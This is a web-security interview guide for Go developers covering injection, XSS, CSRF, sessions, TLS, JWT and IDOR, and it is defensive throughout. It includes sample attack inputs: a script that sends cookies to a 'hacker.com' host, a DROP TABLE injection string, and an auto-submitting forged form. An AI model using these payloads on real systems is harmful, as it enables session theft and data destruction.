### [[↑]](../README.md#toc) <a name='security'>Questions about Security:</a>

#### Security by Default
> How do you write secure code? In your opinion, is it one of the developer's duties, or does it require a specialized role in the company? And why?

**Expert Answer:**

**The Short Answer:** 
Security is the absolute duty of every developer; "security by default" means choosing frameworks and writing code where the easiest, most obvious way to implement a feature is also the most secure way.

**The Deep Dive:** 
You cannot build an insecure application and then hire a security team to "bolt on" security at the end. The developers write the actual business logic, so they must own its safety. A specialized security team is essential for auditing, penetration testing, and setting company-wide policies (like IAM roles), but they don't write the day-to-day code.
Writing "secure by default" code means leveraging your language's built-in protections. In Go, `html/template` automatically escapes HTML to prevent XSS, and `database/sql` natively supports parameterized queries to prevent SQL injection.

**The Trade-offs (Pros/Cons):**
* **Pros:** Drastically reduces the attack surface of the application before it ever reaches a staging environment.
* **Cons:** Requires continuous, mandatory security training for all developers, slowing down initial onboarding.

**Code Example:**
```go
// NOT secure by default (using raw string formatting for HTML)
// Vulnerable to XSS!
fmt.Fprintf(w, "<h1>Hello %s</h1>", userInput)

// SECURE by default (using Go's html/template)
// Automatically escapes malicious input!
tmpl, _ := template.New("test").Parse("<h1>Hello {{.}}</h1>")
tmpl.Execute(w, userInput)
```

#### Don't Invent Cryptography
> Why is it said that cryptography is not something you should try to invent or design yourself?

**Expert Answer:**

**The Short Answer:** 
Cryptography relies on incredibly complex mathematics and resistance to side-channel attacks; if you write your own implementation, you will almost certainly introduce a catastrophic vulnerability.

**The Deep Dive:** 
As the saying goes: "Anyone can invent a cryptosystem that they themselves cannot break." 
Even if your mathematical algorithm is theoretically sound, writing the code to execute it is fraught with peril. Hackers use "side-channel attacks" where they measure the exact microsecond timing of your CPU's instruction execution to guess the encryption key. 
You must always use the standard library (like Go's `crypto` packages), which are written in constant-time assembly and have been audited by global cryptography experts for decades.

**The Trade-offs (Pros/Cons):**
* **Pros (of using standard libraries):** Mathematically proven security; regular security patches from the open-source community.
* **Cons:** None. Never invent your own cryptography for production systems.

**Code Example:**
```go
// BAD: Trying to write your own cipher algorithm using bitwise XORs.
// GOOD: Trusting the standard library.
import "crypto/aes"

func Encrypt(data []byte, key []byte) {
    // Highly optimized, audited, and often hardware-accelerated (AES-NI)
    block, err := aes.NewCipher(key) 
    // ...
}
```

#### 2-FA
> What is two factor authentication? How would you implement it in an existing web application?

**Expert Answer:**

**The Short Answer:** 
2FA requires a user to prove two of three things to authenticate: Something they *know* (password), Something they *have* (phone/hardware key), or Something they *are* (biometrics).

**The Deep Dive:** 
To implement Time-Based One-Time Passwords (TOTP):
1. **Setup:** The user enables 2FA. The backend generates a secure random secret key, saves it in the database for that user, and displays it to the user as a QR code.
2. **Sync:** The user scans it with Google Authenticator (which hashes the secret + current Unix time to generate codes).
3. **Login:** After the password succeeds, the backend prompts for the current 6-digit code.
4. **Verification:** The backend calculates the expected 6-digit code (using the DB secret + current server time) and compares it to the user's input.

**The Trade-offs (Pros/Cons):**
* **Pros:** Neutralizes the threat of compromised passwords from external data breaches.
* **Cons:** Increases user friction during login; requires building account recovery flows for users who lose their phones.

**Code Example:**
```go
// Conceptual TOTP Verification
import "github.com/pquerna/otp/totp"

func Verify2FA(userCode string, userSecretFromDB string) bool {
    // Validates the 6-digit code against the secret and the current server time
    valid := totp.Validate(userCode, userSecretFromDB)
    return valid
}
```

#### Confidential Data in Logs
> If not carefully handled, there is always a risk of logs containing sensitive information, such as passwords. How would you deal with this?

**Expert Answer:**

**The Short Answer:** 
Never log raw HTTP request bodies globally, and implement a structured logging middleware that automatically masks or strips known sensitive fields (like passwords or SSNs) before writing to stdout.

**The Deep Dive:** 
Logs are often shipped to third-party services (Datadog, Splunk) where dozens of employees have read access. Leaking a password in a log is equivalent to a data breach.
To prevent this, use structured logging (like Go's `slog` or `zap`) instead of generic `fmt.Printf`. Implement a centralized logging middleware that inspects outgoing log maps. Furthermore, ensure that any struct containing Personally Identifiable Information (PII) explicitly overrides the `String()` or `MarshalJSON()` methods to omit sensitive data by default.

**The Trade-offs (Pros/Cons):**
* **Pros:** Prevents accidental data breaches and ensures compliance with GDPR/HIPAA.
* **Cons:** Masking large JSON payloads dynamically in middleware can introduce slight CPU and memory overhead.

**Code Example:**
```go
type User struct {
    Email    string
    Password string
}

// Override the default string representation to NEVER print the password
func (u User) String() string {
    return fmt.Sprintf("User{Email: %s, Password: [REDACTED]}", u.Email)
}

func main() {
    u := User{Email: "test@test.com", Password: "supersecret"}
    // Even if a developer accidentally logs the whole struct, it's safe!
    log.Println(u) 
}
```

#### SQL Injection
> Write down a snippet of code affected by SQL injection and fix it.

**Expert Answer:**

**The Short Answer:** 
SQL Injection occurs when user input is concatenated directly into a SQL query string, allowing the user to alter the SQL structure. It is fixed by using Parameterized Queries.

**The Deep Dive:** 
If an attacker inputs `admin'; DROP TABLE users; --`, a concatenated string builds two separate commands, destroying the database. 
Parameterized queries (Prepared Statements) fix this. The database driver sends the SQL *structure* and the *data* in two completely separate packets to the database engine. The database engine compiles the structure first, and then safely inserts the data, making it mathematically impossible for the data to alter the SQL logic.

**The Trade-offs (Pros/Cons):**
* **Pros:** Absolute guarantee against SQL injection attacks.
* **Cons:** Parameterized queries can occasionally prevent the database Query Planner from optimizing the execution path effectively, though this is rare.

**Code Example:**
```go
// BAD: Vulnerable to SQL Injection
userInput := "admin'; DROP TABLE users; --"
query := "SELECT * FROM users WHERE username = '" + userInput + "'"
db.Query(query) // BOOM! Table destroyed.

// GOOD: Safe Parameterized Query
query := "SELECT * FROM users WHERE username = $1"
// The driver ensures `userInput` is treated strictly as a literal string.
db.Query(query, userInput) 
```

#### Detect SQL Injection
> How would it be possible to detect SQL injection via static code analysis?

**Expert Answer:**

**The Short Answer:** 
Static analysis tools use "Taint Analysis" to trace the flow of untrusted variables through the Abstract Syntax Tree (AST) to ensure they never reach a database execution function without being parameterized.

**The Deep Dive:** 
A static analysis tool (like `gosec` for Go) parses the source code into an AST. It identifies "sources" of untrusted input (e.g., HTTP request bodies, URL parameters). This data is marked as "tainted." 
The tool then traces every function call and variable assignment. If a tainted string reaches a sensitive "sink" (e.g., `db.Query()`, `os.Exec()`) without passing through a sanitization function or being bound as a prepared parameter, the tool flags it as a critical vulnerability.

**The Trade-offs (Pros/Cons):**
* **Pros:** Catches vulnerabilities in CI/CD before the code is ever deployed or run.
* **Cons:** Can produce high rates of false positives, requiring developers to manually add "ignore" comments to safe code.

**Code Example:**
```bash
# In Go, you run 'gosec' in your CI pipeline to catch SQL injections statically.
gosec ./...
# Output:
# [SQL Injection] string formatting in database query detected
# File: main.go:42
```

#### XSS
> What do you know about Cross-Site Scripting? 

**Expert Answer:**

**The Short Answer:** 
XSS occurs when an application renders untrusted, user-supplied data in a web page without proper HTML escaping, allowing attackers to execute malicious JavaScript in other users' browsers.

**The Deep Dive:** 
Imagine a blog platform. An attacker leaves a comment containing: `<script>fetch('http://hacker.com?cookie=' + document.cookie)</script>`. 
If the backend saves this to the database and renders it *raw* on the page, every user who views the blog will execute that script. The script steals their session cookies and sends them to the hacker, completely compromising their accounts. 
It is mitigated by strict context-aware output encoding (converting `<` to `&lt;`), which modern frameworks (like React or Go's `html/template`) do automatically.

**The Trade-offs (Pros/Cons):**
* **Pros (of auto-escaping):** Neutralizes the vast majority of XSS attacks.
* **Cons:** Can make rendering intentional, safe HTML (like from a trusted Markdown parser) slightly annoying, requiring explicit "dangerously set HTML" overrides.

**Code Example:**
```go
// In Go, html/template provides Context-Aware escaping.
// It knows if the variable is inside a tag, an attribute, or a JS block,
// and escapes it differently to guarantee safety.
tmpl, _ := template.New("").Parse(`<a href="/?q={{.}}">Search</a>`)

// If the input is `<script>alert(1)</script>`, it is safely escaped to:
// <a href="/?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E">Search</a>
tmpl.Execute(w, userInput)
```

#### Cross-Site Forgery Attack
> What do you know about Cross-Site Forgery Attack? 

**Expert Answer:**

**The Short Answer:** 
CSRF tricks an authenticated user's browser into executing an unwanted action on a web application (like transferring money) without their knowledge.

**The Deep Dive:** 
If you are logged into `bank.com`, your browser holds a valid session cookie. 
If you then visit a malicious site (`evil.com`), that site might contain a hidden form: `<form action="http://bank.com/transfer" ...><script>form.submit()</script>`. 
Your browser will automatically attach your `bank.com` session cookie to the request. The bank sees a valid cookie and authorizes the transfer. 
It is mitigated using Anti-CSRF tokens (a unique, unguessable string required in the payload of all state-changing forms) or by configuring cookies with the `SameSite` attribute.

**The Trade-offs (Pros/Cons):**
* **Pros (of Anti-CSRF tokens):** Highly effective protection against forgery.
* **Cons:** Requires the backend to generate, store, and validate tokens for every single HTML form, adding architectural complexity.

**Code Example:**
```go
// Modern mitigation: The SameSite Cookie Attribute
// This tells the browser: "NEVER send this cookie if the request originated 
// from a different domain (like evil.com)."
cookie := &http.Cookie{
    Name:     "session_id",
    Value:    "secret123",
    HttpOnly: true,
    Secure:   true,
    SameSite: http.SameSiteStrictMode, // Defeats CSRF natively!
}
http.SetCookie(w, cookie)
```

#### HTTPS
> How does HTTPS work?

**Expert Answer:**

**The Short Answer:** 
HTTPS wraps standard HTTP traffic inside an encrypted TLS (Transport Layer Security) tunnel, utilizing both asymmetric cryptography for the initial handshake and symmetric cryptography for fast data transfer.

**The Deep Dive:** 
1. **Handshake:** The client connects to the server and requests a secure connection.
2. **Certificate:** The server responds with its public key and an SSL certificate signed by a trusted Certificate Authority (CA) to prove it is actually the server it claims to be.
3. **Key Exchange:** Using the server's public key (Asymmetric Cryptography), the client and server securely negotiate a shared "Session Key."
4. **Encryption:** Because asymmetric cryptography is too slow for web traffic, all subsequent HTTP traffic is encrypted using that shared Session Key (Symmetric Cryptography), ensuring fast, secure data transfer.

**The Trade-offs (Pros/Cons):**
* **Pros:** Guarantees data privacy and integrity in transit.
* **Cons:** The initial TLS handshake adds a few round-trips of latency to the first request (mitigated heavily in modern TLS 1.3).

**Code Example:**
```go
// Starting an HTTPS server in Go requires a Certificate and a Private Key.
func main() {
    http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
        w.Write([]byte("Secure Hello!"))
    })
    
    // Automatically handles the TLS Handshake and Encryption
    log.Fatal(http.ListenAndServeTLS(":443", "cert.pem", "key.pem", nil))
}
```

#### MITM Attack
> What's a man-in-the-middle Attack, and why does HTTPS help protect against it?

**Expert Answer:**

**The Short Answer:** 
A MITM attack occurs when a hacker secretly intercepts communication between a client and server. HTTPS prevents this by using Certificates to mathematically prove the server's identity.

**The Deep Dive:** 
Imagine connecting to a rogue public WiFi router at a coffee shop. When you type `bank.com`, the rogue router intercepts the connection and pretends to be the bank, capturing your password. 
HTTPS defeats this via **Certificates**. During the TLS handshake, the rogue router must present an encryption key. The browser demands a cryptographic certificate proving the key belongs to `bank.com`, signed by a trusted root Certificate Authority (like Let's Encrypt or DigiCert). Since the hacker cannot forge this signature, the browser realizes the server is an imposter, throws a massive red warning screen, and terminates the connection.

**The Trade-offs (Pros/Cons):**
* **Pros:** Absolute cryptographic assurance of server identity.
* **Cons:** Managing, rotating, and renewing certificates before they expire is a significant operational burden (though tools like cert-manager automate this).

**Code Example:**
```go
// Not applicable for backend code, but conceptually:
// If a Go client tries to connect to a MITM attacker, 
// the default HTTP client will panic and abort the request.
_, err := http.Get("https://intercepted-bank.com")
// err: x509: certificate signed by unknown authority
```

#### Stealing Sessions
> How can you prevent the user's session from being stolen?

**Expert Answer:**

**The Short Answer:** 
Prevent session theft by securing cookies with the `HttpOnly`, `Secure`, and `SameSite` flags, and by enforcing strict session expiration and rotation policies.

**The Deep Dive:** 
1.  **HttpOnly Flag:** Prevents client-side JavaScript from reading `document.cookie`. This completely neutralizes the ability for XSS attacks to steal the session cookie.
2.  **Secure Flag:** Ensures the cookie is only transmitted over an encrypted HTTPS connection, preventing packet-sniffing on open networks.
3.  **SameSite Attribute:** Set to `Strict` or `Lax` to prevent the browser from sending the cookie during cross-site requests, mitigating CSRF attacks.
4.  **Session Rotation:** Whenever a user's privilege level changes (like going from anonymous to logged-in), you must destroy the old session ID and issue a brand new one to prevent Session Fixation attacks.

**The Trade-offs (Pros/Cons):**
* **Pros:** Locks down the session against almost all modern web attack vectors.
* **Cons:** `HttpOnly` means your own frontend SPA (React/Vue) cannot read the session token, requiring you to carefully architecture how the frontend knows if the user is authenticated.

**Code Example:**
```go
// The gold standard for a secure session cookie in Go
func IssueSessionCookie(w http.ResponseWriter, sessionID string) {
    cookie := &http.Cookie{
        Name:     "session_id",
        Value:    sessionID,
        Path:     "/",
        HttpOnly: true,                    // No XSS theft
        Secure:   true,                    // HTTPS only
        SameSite: http.SameSiteStrictMode, // No CSRF
        MaxAge:   3600,                    // Expires in 1 hour
    }
    http.SetCookie(w, cookie)
}
```


#### Zero Trust Architecture
> What does "Zero Trust" actually mean in a corporate network context?

**Expert Answer:**

**The Short Answer:** 
It means assuming the internal network is already compromised; therefore, every single request between servers must be explicitly authenticated and authorized, not just traffic coming from the outside.

**The Deep Dive:** 
Historically, companies used a "Castle-and-Moat" architecture (VPNs). If you were outside, you were blocked. If you got past the firewall (into the castle), you had access to everything. Zero Trust assumes the moat is useless. Under Zero Trust, if the internal `BillingService` calls the internal `UserService`, the `UserService` rejects it unless the request contains a cryptographic identity token (mTLS or JWT) proving it is authorized to make that specific call. Location (being on the internal IP subnet) implies zero trust.

**The Trade-offs (Pros/Cons):**
* **Pros:** Massively limits the blast radius of a hack. If a hacker breaches a web server, they cannot move laterally to the database.
* **Cons:** Requires immense infrastructure (Public Key Infrastructure, Service Meshes) to constantly rotate and validate identity certificates between thousands of microservices.

#### JWT (JSON Web Tokens) vs Stateful Sessions
> Why did the industry move to JWTs for APIs, and what are their massive security flaws?

**Expert Answer:**

**The Short Answer:** 
JWTs are stateless, meaning the server doesn't need to look up a session in a database, allowing infinite horizontal scaling. However, they cannot be reliably revoked before they expire.

**The Deep Dive:** 
In Stateful Sessions, the server stores a session ID in Redis. Every API call requires querying Redis (adding latency). A JWT is a cryptographically signed JSON blob containing the user's ID. The server simply verifies the math of the signature (no database lookup required). 
The flaw: Because the server doesn't store state, if a hacker steals a JWT, the server *cannot* revoke it. Even if the user changes their password, the stolen JWT remains valid until its built-in expiration time hits. The fix is keeping JWT lifetimes extremely short (e.g., 5 minutes) and using long-lived Refresh Tokens to fetch new ones.

**The Trade-offs (Pros/Cons):**
* **Pros:** Perfect for stateless microservices; fast to validate.
* **Cons:** Revocation is practically impossible without introducing a "blacklist" in a database, which completely defeats the purpose of being stateless.

#### OWASP Top 10: Broken Access Control (IDOR)
> What is Insecure Direct Object Reference (IDOR) and why is it so common in REST APIs?

**Expert Answer:**

**The Short Answer:** 
IDOR occurs when an API endpoint uses an ID in the URL to fetch data but fails to check if the currently logged-in user actually owns that ID.

**The Deep Dive:** 
A developer writes `GET /api/receipts/{id}`. The code fetches the receipt from the database and returns it. User A logs in and their frontend requests `/api/receipts/10`. User A then manually changes the URL to `/api/receipts/11`. Because the backend only checked *if* the user was logged in (Authentication) but forgot to check if the user *owned* receipt #11 (Authorization), User A just stole User B's financial data. It is the #1 vulnerability on the internet because automated security scanners cannot easily detect business-logic ownership rules.

**The Trade-offs (Pros/Cons):**
* **Pros (of fixing):** Protects PII and prevents catastrophic data breaches.
* **Cons:** Requires rigorous, tedious authorization checks on literally every single API endpoint that accepts a parameter.

#### Cross-Site Request Forgery (CSRF) in the API Era
> Are CSRF attacks still relevant if you are building a React SPA with a JSON REST API?

**Expert Answer:**

**The Short Answer:** 
CSRF is mostly dead if your API uses standard Authorization headers (like Bearer tokens), but it is still highly relevant if your API relies on browser Cookies for authentication.

**The Deep Dive:** 
CSRF works because browsers automatically attach Cookies to every request sent to a domain, even if the request was secretly triggered by a malicious website in another tab. If your React app stores the session token in `localStorage` and manually attaches it as an `Authorization: Bearer <token>` header, CSRF is mathematically impossible (the malicious tab cannot read your `localStorage`). However, storing tokens in `localStorage` opens you up to XSS (Cross-Site Scripting). If you use `HttpOnly` cookies to defeat XSS, you must implement strict `SameSite` cookie attributes or anti-CSRF tokens to prevent CSRF.

**The Trade-offs (Pros/Cons):**
* **Pros (Cookies):** Immune to XSS stealing the token; vulnerable to CSRF.
* **Pros (Local Storage):** Immune to CSRF; vulnerable to XSS. (Most modern architectures prefer `HttpOnly` Cookies with `SameSite=Strict`).
